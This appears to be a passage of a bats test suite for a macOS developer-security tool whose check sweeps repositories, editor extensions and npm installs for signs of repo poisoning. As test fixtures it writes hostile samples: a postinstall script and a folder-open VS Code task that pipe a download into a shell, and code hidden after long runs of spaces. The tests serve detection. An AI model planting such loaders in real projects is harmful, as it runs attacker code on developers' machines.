  run bash -c "(printf 'no\n'; sleep 2) | script -q /dev/null /bin/bash '$BL' accept"
  [[ "$output" == *"not accepted"* ]]; [ ! -e "$(B listeners.txt)" ]; [ ! -e "$(B control-files.txt)" ]
  term
  [[ "$output" == *"no scan yet, skipped"* ]]; [[ "$output" == *"baseline accepted"* ]]
  [ -f "$(B listeners.txt)" ]; [ -f "$(B control-files.txt)" ]; [ ! -e "$(B knockknock.json)" ]
}
@test "baseline.sh accept writes outside the clone, folder mode 700 and files mode 600; never through a symlink" {
  ctl_home; fakeps
  kk latest '{"x":[{"path":"/a"}]}'
  term
  [[ "$output" == *"baseline accepted"* ]]
  [ "$(stat -f %Lp "$(B)")" = 700 ]
  for f in knockknock.json listeners.txt control-files.txt; do [ "$(stat -f %Lp "$(B "$f")")" = 600 ]; done
  [ ! -e "$DEVWARD_REPORTS/baseline" ]; [ ! -e "$DEVWARD_REPORTS/knockknock/baseline.json" ]
  rm -r "$(B)"; mkdir "$BATS_TEST_TMPDIR/elsewhere"; ln -s "$BATS_TEST_TMPDIR/elsewhere" "$(B)"
  term
  [[ "$output" == *"isn't a plain file in a plain folder"* ]]; [ -z "$(ls -A "$BATS_TEST_TMPDIR/elsewhere")" ]
  rm "$(B)"; mkdir "$(B)"; ln -s "$BATS_TEST_TMPDIR/elsewhere/l" "$(B listeners.txt)"
  term
  [[ "$output" == *"isn't a plain file in a plain folder"* ]]; [ ! -e "$BATS_TEST_TMPDIR/elsewhere/l" ]
}
commit() { git -C "$1" add -A && git -C "$1" -c user.email=t@example.invalid -c user.name=t commit -qm x; }
repo() { mkdir -p "$1"; git init -q "$1"; echo hello > "$1/README.md"; commit "$1"; }  # DIR — a throwaway repo
gap() { printf 'module.exports = {};%60s%s\n' '' "require('./x')" > "$1/postcss.config.js"; commit "$1"; }  # code after 60 spaces
sweep() { DEVWARD_WEEKLY_RUN=1 chk GD-RC-01; }  # the weekly run: always sweeps
@test "GD-RC-01 no repos in the code folders → NA; clean repos → PASS; a poisoned one → FAIL naming repo, file and rule" {
  sweep; [ "$(field status)" = NA ]
  repo "$HOME/dev/app"; repo "$HOME/Projects/team/site"
  sweep; [ "$(field status)" = PASS ]; [ "$(field evidence)" = "2 repo(s) swept, none flagged" ]
  gap "$HOME/Projects/team/site"
  sweep; [ "$(field status)" = FAIL ]; [ "$(field evidence)" = "1 repo-poisoning indicator(s) in 1 repo(s)" ]
  [[ "$(field note)" == *"/Projects/team/site:postcss.config.js:1 (code hidden after a long run of spaces"* ]]; [[ "$(field note)" == *"/if-red"* ]]
}
@test "GD-RC-01 also sweeps the editors' extension folders for payload markers, but not for obfuscated bundles" {
  X="$HOME/.vscode/extensions/pub.ext-1.0.0/dist"; mkdir -p "$X"
  printf 'return a=function(b,c){b=b-%s;\n' 0x1f > "$X/bundle.js"  # assembled, so this file carries no marker
  sweep; [ "$(field status)" = PASS ]; [ "$(field evidence)" = "0 repo(s) and 1 editor extension folder(s) swept, none flagged" ]
  p1='Cot%3'; p2='t=shtP'; printf 'var s = "%s%s";\n' "$p1" "$p2" > "$X/extension.js"
  repo "$HOME/dev/app"
  sweep; [ "$(field status)" = FAIL ]; [ "$(field evidence)" = "1 repo-poisoning indicator(s) in 1 repo(s) or extension folder(s)" ]
  [[ "$(field note)" == "~/.vscode/extensions:pub.ext-1.0.0/dist/extension.js:1 (payload markers: v2-string"* ]]
  echo "$HOME/.vscode" > "$DEVWARD_PRIVATE_PATHS"
  sweep; [ "$(field status)" = PASS ]; [ "$(field evidence)" = "1 repo(s) swept, none flagged" ]; [ "$(field note)" = "(a private folder was excluded)" ]
}
@test "GD-RC-01 also sweeps ~/Desktop and ~/Downloads, and names the code folders it looked in" {
  sweep; [ "$(field status)" = NA ]; [[ "$(field note)" == *"~/Documents/GitHub, ~/Desktop or ~/Downloads exist"* ]]
  repo "$HOME/Desktop/site"; repo "$HOME/Downloads/task-main/app"; gap "$HOME/Downloads/task-main/app"
  sweep; [ "$(field status)" = FAIL ]; [[ "$(field note)" == *"/Downloads/task-main/app:postcss.config.js:1"* ]]
  rm -rf "$HOME/Downloads/task-main"
  sweep; [ "$(field status)" = PASS ]; [ "$(field evidence)" = "1 repo(s) swept, none flagged" ]
}
@test "GD-RC-01 also sweeps ~/workspace, ~/Development and ~/source" {
  sweep; [[ "$(field note)" == *"~/workspace, ~/Development, ~/source"* ]]
  repo "$HOME/workspace/a"; repo "$HOME/Development/b"; repo "$HOME/source/c"
  sweep; [ "$(field status)" = PASS ]; [ "$(field evidence)" = "3 repo(s) swept, none flagged" ]
}
@test "GD-RC-01 without Apple's Command Line Tools is ERROR saying so, and stores nothing" {
  repo "$HOME/dev/app"; stub xcode-select 'exit 2'
  sweep; [ "$(field status)" = ERROR ]; [[ "$(field evidence)" == *"Command Line Tools"* ]]
  [[ "$(field note)" == *"xcode-select --install"* ]]; [ ! -e "$HOME/.config/devward/repo-sweep.json" ]
}
@test "GD-RC-01 a code folder macOS won't let it read is ERROR naming it, not a PASS" {
  [ "$(id -u)" -ne 0 ] || skip "root reads everything"
  repo "$HOME/dev/app"; mkdir -p "$HOME/Downloads"; chmod 000 "$HOME/Downloads"
  sweep; chmod 755 "$HOME/Downloads"
  [ "$(field status)" = ERROR ]; [ "$(field note)" = "macOS privacy settings blocked reading: ~/Downloads." ]
  rm -rf "$HOME/dev"; chmod 000 "$HOME/Downloads"
  sweep; chmod 755 "$HOME/Downloads"
  [ "$(field status)" = ERROR ]; [ "$(field evidence)" = "Could not read every code folder" ]
}
@test "GD-RC-01 a payload marker fails; a lone agent config doesn't; an auto-run task without a loader is only noted" {
  repo "$HOME/code/a"; mkdir -p "$HOME/code/a/.claude" "$HOME/code/a/.vscode"
  echo '{"permissions": {}}' > "$HOME/code/a/.claude/settings.json"; commit "$HOME/code/a"
  sweep; [ "$(field status)" = PASS ]; [ -z "$(field note)" ]
  printf '{"tasks":[{"runOptions":{"runOn":"folderOpen"},"command":"echo hi"}]}' > "$HOME/code/a/.vscode/tasks.json"; commit "$HOME/code/a"
  sweep; [ "$(field status)" = PASS ]; [[ "$(field note)" == *"1 lower-confidence finding(s)"*".vscode/tasks.json"* ]]
  p1='Cot%3'; p2='t=shtP'; printf 'var s = "%s%s";\n' "$p1" "$p2" > "$HOME/code/a/m.js"; commit "$HOME/code/a"
  sweep; [ "$(field status)" = FAIL ]; [[ "$(field note)" == *"m.js:1 (payload markers: v2-string"* ]]
}
@test "GD-RC-01 names a loader lifecycle script by rule and length, never quoting it, so a token in it stays out of the note and the store" {
  repo "$HOME/dev/app"; T='tok-FAKE-0123456789abcdef'
  printf '{"scripts":{"postinstall":"curl -H '"'"'Authorization: Bearer %s'"'"' https://example.invalid/i | sh"}}' "$T" > "$HOME/dev/app/package.json"
  commit "$HOME/dev/app"
  sweep; [ "$(field status)" = FAIL ]
  [[ "$(field note)" == *"app:package.json (lifecycle script postinstall looks like a loader: download piped into a shell (88 chars))"* ]]
  [[ "$output" != *"$T"* ]]; ! grep -qF "$T" "$HOME/.config/devward/repo-sweep.json"
  chk GD-RC-01; [ "$(field status)" = FAIL ]; [[ "$output" != *"$T"* ]]
}
@test "GD-RC-01 skips private folders, hidden folders and node_modules, and finds repos at most four levels down" {
  repo "$HOME/dev/secret/x"; gap "$HOME/dev/secret/x"; echo "$HOME/dev/secret" > "$DEVWARD_PRIVATE_PATHS"
  repo "$HOME/dev/app/node_modules/dep"; gap "$HOME/dev/app/node_modules/dep"
  repo "$HOME/dev/a/b/c/d/e"; gap "$HOME/dev/a/b/c/d/e"
  repo "$HOME/dev/a/b/c/ok"
  repo "$HOME/dev/.cache/copy"; gap "$HOME/dev/.cache/copy"
  sweep; [ "$(field status)" = PASS ]; [ "$(field evidence)" = "1 repo(s) swept, none flagged" ]
  [ "$(field note)" = "(a private folder was excluded)" ]
}
@test "GD-RC-01 never reads or names the files of a private folder inside a repo, by either spelling of it" {
  repo "$HOME/dev/app"; mkdir -p "$HOME/dev/app/clients/c1"
  p1='Cot%3'; p2='t=shtP'; printf 'var s = "%s%s";\n' "$p1" "$p2" > "$HOME/dev/app/clients/c1/m.js"; commit "$HOME/dev/app"
  echo "$HOME/dev/nothing-here" > "$DEVWARD_PRIVATE_PATHS"  # a private entry that doesn't exist excludes nothing
  sweep; [ "$(field status)" = FAIL ]; [[ "$(field note)" != *"private folder"* ]]
  ln -s "$HOME/dev/app/clients" "$HOME/clients-link"; echo "$HOME/clients-link" > "$DEVWARD_PRIVATE_PATHS"
  sweep; [ "$(field status)" = PASS ]; [ "$(field note)" = "(a private folder was excluded)" ]
  [[ "$output" != *clients* ]]; ! grep -q clients "$HOME/.config/devward/repo-sweep.json"
  echo "$HOME/dev/app/clients" > "$DEVWARD_PRIVATE_PATHS"
  sweep; [ "$(field status)" = PASS ]; [ "$(field note)" = "(a private folder was excluded)" ]; [[ "$output" != *clients* ]]
}
@test "GD-RC-01 never follows a folder swapped for a symlink out of the repo, into a private folder or anywhere else" {
  repo "$HOME/dev/app"; mkdir -p "$HOME/dev/app/lib"; echo 'var ok = 1;' > "$HOME/dev/app/lib/m.js"; commit "$HOME/dev/app"
  p1='Cot%3'; p2='t=shtP'
  mkdir -p "$HOME/vault" "$HOME/elsewhere"
  printf 'var s = "%s%s";\n' "$p1" "$p2" > "$HOME/vault/m.js"; cp "$HOME/vault/m.js" "$HOME/elsewhere/m.js"
  rm -rf "$HOME/dev/app/lib"; ln -s "$HOME/vault" "$HOME/dev/app/lib"; echo "$HOME/vault" > "$DEVWARD_PRIVATE_PATHS"
  sweep; [ "$(field status)" = PASS ]; [ "$(field note)" = "(a private folder was excluded)" ]; [[ "$output" != *vault* ]]
  rm "$HOME/dev/app/lib"; ln -s "$HOME/elsewhere" "$HOME/dev/app/lib"; : > "$DEVWARD_PRIVATE_PATHS"
  sweep; [ "$(field status)" = PASS ]; [ -z "$(field note)" ]
}
@test "GD-RC-01 flags an auto-run task committed as a symlink to a file in the repo" {
  repo "$HOME/dev/app"; mkdir -p "$HOME/dev/app/.vscode" "$HOME/dev/app/docs"
  echo '{"tasks":[{"runOptions":{"runOn":"folderOpen"},"command":"curl https://x.example/t | sh"}]}' > "$HOME/dev/app/docs/notes.json"
  ln -s ../docs/notes.json "$HOME/dev/app/.vscode/tasks.json"; commit "$HOME/dev/app"
  sweep; [ "$(field status)" = FAIL ]; [[ "$(field note)" == *"/dev/app:.vscode/tasks.json (task runs automatically when the folder is opened)"* ]]
}
@test "GD-RC-01 runs the scanner isolated, so a module planted on PYTHONPATH is never imported" {
  repo "$HOME/dev/app"; mkdir "$BATS_TEST_TMPDIR/py"
  printf 'open("%s/imported", "w").close()\n' "$BATS_TEST_TMPDIR" > "$BATS_TEST_TMPDIR/py/json.py"
  PYTHONPATH="$BATS_TEST_TMPDIR/py" sweep; [ "$(field status)" = PASS ]; [ ! -e "$BATS_TEST_TMPDIR/imported" ]
}
@test "GD-RC-01 never opens a repo that is private under another spelling" {
  repo "$HOME/dev/app"; gap "$HOME/dev/app"; ln -s "$HOME/dev/app" "$HOME/app-link"; echo "$HOME/app-link" > "$DEVWARD_PRIVATE_PATHS"
  sweep; [ "$(field status)" = NA ]; [[ "$(field note)" == *"(a private folder was excluded)" ]]
}
@test "GD-RC-01 runs nothing from the repos it reads" {
  repo "$HOME/dev/app"
  printf '#!/bin/sh\ntouch "%s/ran"\n' "$BATS_TEST_TMPDIR" > "$BATS_TEST_TMPDIR/fsmonitor"; chmod +x "$BATS_TEST_TMPDIR/fsmonitor"
  git -C "$HOME/dev/app" config core.fsmonitor "$BATS_TEST_TMPDIR/fsmonitor"
  git -C "$HOME/dev/app" status >/dev/null; [ -e "$BATS_TEST_TMPDIR/ran" ]; rm "$BATS_TEST_TMPDIR/ran"  # git itself would run it
  sweep; [ "$(field status)" = PASS ]; [ ! -e "$BATS_TEST_TMPDIR/ran" ]
}
@test "GD-RC-01 a repo it can't list, or a sweep cut short by time, is ERROR, not PASS" {
  repo "$HOME/dev/app"; mkdir -p "$HOME/dev/broken/.git"
  sweep; [ "$(field status)" = ERROR ]; [[ "$(field note)" == *"Could not list the files of 1 repo(s): "*"/dev/broken."* ]]
  rm -rf "$HOME/dev/broken"
  DEVWARD_SWEEP_TIMEOUT=1 sweep; [ "$(field status)" = ERROR ]; [[ "$(field note)" == *"time ran out after 0 of 1"* ]]
}
@test "GD-RC-01 a repo whose history it can't read is ERROR, not PASS" {
  repo "$HOME/dev/app"; echo 0123456789012345678901234567890123456789 > "$HOME/dev/app/.git/refs/heads/broken"
  sweep; [ "$(field status)" = ERROR ]; [[ "$(field note)" == *"/dev/app:(history) (could not read the commit history)"* ]]
}
@test "GD-RC-01 sweeps a repo whose path holds a newline" {
  repo "$HOME/dev/a"$'\n'"b"; gap "$HOME/dev/a"$'\n'"b"
  sweep; [ "$(field status)" = FAIL ]; [ "$(field evidence)" = "1 repo-poisoning indicator(s) in 1 repo(s)" ]
}
@test "GD-RC-01 a repo folder gone by the time it is opened is ERROR, not PASS" {
  repo "$HOME/dev/ok"
  stub find '/usr/bin/find "$@"; [ "$1" != "$HOME/dev" ] || printf "%s/dev/gone/.git\0" "$HOME"'  # removed after find saw it
  sweep; [ "$(field status)" = ERROR ]; [[ "$(field note)" == *"~/dev/gone"* ]]
}
@test "GD-RC-01 sweeps in the weekly run or when nothing is stored; other runs report the stored result with its age" {
  repo "$HOME/dev/app"
  chk GD-RC-01; [ "$(field status)" = PASS ]; [ "$(field evidence)" = "1 repo(s) swept, none flagged" ]
  [ "$(jq -r .status "$HOME/.config/devward/repo-sweep.json")" = PASS ]
  gap "$HOME/dev/app"
  chk GD-RC-01; [ "$(field status)" = PASS ]; [ "$(field evidence)" = "1 repo(s) swept, none flagged (weekly sweep, 0 day(s) ago)" ]
  sweep; [ "$(field status)" = FAIL ]; [ "$(field evidence)" = "1 repo-poisoning indicator(s) in 1 repo(s)" ]
  chk GD-RC-01; [ "$(field status)" = FAIL ]; [ "$(field evidence)" = "1 repo-poisoning indicator(s) in 1 repo(s) (weekly sweep, 0 day(s) ago)" ]
  [[ "$(field note)" == *"/if-red"* ]]
  jq '.time -= 9 * 86400' "$HOME/.config/devward/repo-sweep.json" > "$BATS_TEST_TMPDIR/s"; mv "$BATS_TEST_TMPDIR/s" "$HOME/.config/devward/repo-sweep.json"
  chk GD-RC-01; [ "$(field status)" = FAIL ]; [ "$(field evidence)" = "The weekly sweep hasn't run: the last one is 9 days old" ]
  echo '{"status":"PASS"}' > "$HOME/.config/devward/repo-sweep.json"
  chk GD-RC-01; [ "$(field status)" = ERROR ]; [ -n "$(field evidence)" ]
  rm "$HOME/.config/devward/repo-sweep.json"; mkdir "$HOME/.config/devward/repo-sweep.json.tmp"  # the result can't be written
  chk GD-RC-01; [ "$(field status)" = FAIL ]; [[ "$(field note)" == *"Could not store this result in "*"so the next review sweeps again."* ]]
}
@test "GD-RC-01 a stored result dated more than a day ahead is ERROR, not a PASS that never goes stale" {
  repo "$HOME/dev/app"; S="$HOME/.config/devward/repo-sweep.json"
  sweep; [ "$(field status)" = PASS ]
  jq '.time += 3600' "$S" > "$BATS_TEST_TMPDIR/s"; mv "$BATS_TEST_TMPDIR/s" "$S"
  chk GD-RC-01; [ "$(field status)" = PASS ]; [[ "$(field evidence)" == *"(weekly sweep, 0 day(s) ago)" ]]  # clock skew
  jq '.time += 2 * 86400' "$S" > "$BATS_TEST_TMPDIR/s"; mv "$BATS_TEST_TMPDIR/s" "$S"
  chk GD-RC-01; [ "$(field status)" = ERROR ]; [[ "$(field evidence)" == *"dated in the future"* ]]
}
@test "GD-RC-01 never reads or writes its stored result through a symlink" {
  repo "$HOME/dev/app"; S="$HOME/.config/devward/repo-sweep.json"; E="$BATS_TEST_TMPDIR/elsewhere"; mkdir -p "$E" "${S%/*}"
  jq -nc --argjson t "$(date +%s)" '{status: "PASS", evidence: "forged", note: "", time: $t}' > "$E/r.json"; ln -s "$E/r.json" "$S"
  chk GD-RC-01; [ "$(field status)" = ERROR ]; [[ "$(field evidence)" == *"isn't a plain file"* ]]; [[ "$output" != *forged* ]]
  sweep; [ "$(field status)" = PASS ]; [[ "$(field note)" == *"Could not store this result"* ]]; [[ "$(jq -r .evidence "$E/r.json")" = forged ]]
  rm "$S"; ln -s "$E/t.json" "$S.tmp"
  sweep; [ "$(field status)" = PASS ]; [[ "$(field note)" == *"Could not store this result"* ]]; [ ! -e "$E/t.json" ]; [ ! -e "$S" ]
  rm -f "$S.tmp"; rm -r "${S%/*}"; ln -s "$E" "${S%/*}"
  sweep; [ "$(field status)" = PASS ]; [[ "$(field note)" == *"Could not store this result"* ]]; [ ! -e "$E/repo-sweep.json" ]
}
@test "GD-RC-01 names a repo too large to read in full, which it scans only for config, hook and agent files" {
  repo "$HOME/dev/big"; mkdir "$HOME/dev/big/f"; (cd "$HOME/dev/big/f" && touch $(seq 1 5001)); commit "$HOME/dev/big"
  sweep; [ "$(field status)" = PASS ]
  [[ "$(field note)" == "1 repo(s) over 5000 files had only their config, hook and agent files scanned: "*"/dev/big." ]]
}
@test "GD-RC-01 also checks npm's own cli.js, in a version manager's install or behind the npm on PATH" {
  C="$HOME/.nvm/versions/node/v22.0.0/lib/node_modules/npm/lib/cli.js"; mkdir -p "${C%/*}"; echo "require('./cli-entry.js')" > "$C"
  sweep; [ "$(field status)" = PASS ]; [ "$(field evidence)" = "0 repo(s) and 1 npm install(s) swept, none flagged" ]
  head -c 5000 /dev/zero | tr '\0' ' ' >> "$C"
  sweep; [ "$(field status)" = FAIL ]; [ "$(field evidence)" = "1 repo-poisoning indicator(s) in 1 repo(s) or npm install(s)" ]
  [[ "$(field note)" == *"/npm/lib/cli.js:lib/cli.js (npm's cli.js is 5026 bytes"* ]]
  rm -rf "$HOME/.nvm"; P="$BATS_TEST_TMPDIR/pkg/npm"; mkdir -p "$P/bin" "$P/lib"; : > "$P/bin/npm-cli.js"
  head -c 5000 /dev/zero | tr '\0' ' ' > "$P/lib/cli.js"; ln -s "$P/bin/npm-cli.js" "$BATS_TEST_TMPDIR/bin/npm"
  sweep; [ "$(field status)" = FAIL ]; [[ "$(field note)" == *"/pkg/npm/lib/cli.js:lib/cli.js (npm's cli.js is 5000 bytes"* ]]
}
@test "GD-RC-01 finds the npm on the person's PATH (DEVWARD_USER_PATH), not only on the one devward runs with" {
  P="$BATS_TEST_TMPDIR/pkg/npm"; mkdir -p "$P/bin" "$P/lib" "$BATS_TEST_TMPDIR/user-bin"; : > "$P/bin/npm-cli.js"
  head -c 5000 /dev/zero | tr '\0' ' ' > "$P/lib/cli.js"; ln -s "$P/bin/npm-cli.js" "$BATS_TEST_TMPDIR/user-bin/npm"
  DEVWARD_USER_PATH="$BATS_TEST_TMPDIR/user-bin:/usr/bin:/bin" sweep
  [ "$(field status)" = FAIL ]; [[ "$(field note)" == *"/pkg/npm/lib/cli.js:lib/cli.js (npm's cli.js is 5000 bytes"* ]]
}
